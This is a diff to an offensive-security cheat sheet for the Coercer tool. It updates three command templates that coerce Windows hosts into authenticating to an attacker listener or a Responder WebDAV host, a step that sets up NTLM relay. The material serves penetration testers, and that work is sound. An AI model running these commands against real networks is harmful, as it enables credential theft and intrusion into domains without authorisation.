@@ -5,17 +5,17 @@
 ## coercer - list vulns
 #plateform/linux #target/remote #cat/RECON
 ```
-coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
+coercer.py -d '<domain_fqdn>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
 ```
 
 ## coercer - Webdav
 #plateform/linux #target/remote #cat/RECON
 ```
-coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
+coercer.py -d '<domain_fqdn>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
 ```
 
 ## coercer - List vulns many targets
 #plateform/linux #target/remote #cat/RECON
 ```
-coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
+coercer.py -d '<domain_fqdn>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
 ```
